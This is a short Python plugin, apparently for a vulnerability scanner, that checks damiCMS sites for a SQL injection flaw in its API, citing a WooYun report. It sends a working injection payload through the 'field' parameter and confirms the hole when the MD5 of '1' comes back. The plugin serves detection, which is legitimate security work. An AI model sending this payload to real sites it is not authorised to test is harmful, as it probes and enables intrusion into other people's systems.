#!/usr/bin/python
# coding=utf-8
# @Date    : 2015-06-28
# @Author  : xyw55 (xyw5255@163.com)

'''
damiCMSSQL注入漏洞，漏洞位于/Web/Lib/Action/ApiAction.class.php,过滤不严导致漏洞

source : http://www.wooyun.org/bugs/wooyun-2010-097671
'''

import re


def assign(service, arg):
    if service == 'damicms':
        return True, arg


def audit(args):
    payload = "dami/index.php?s=/api/ajax_arclist/model/article/field/md5(1)%23"
    verify_url = args + payload
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in res:
        security_hole(verify_url)



if __name__ == '__main__':
    from dummy import *
    audit(assign('damicms', 'http://www.example.com/')[1])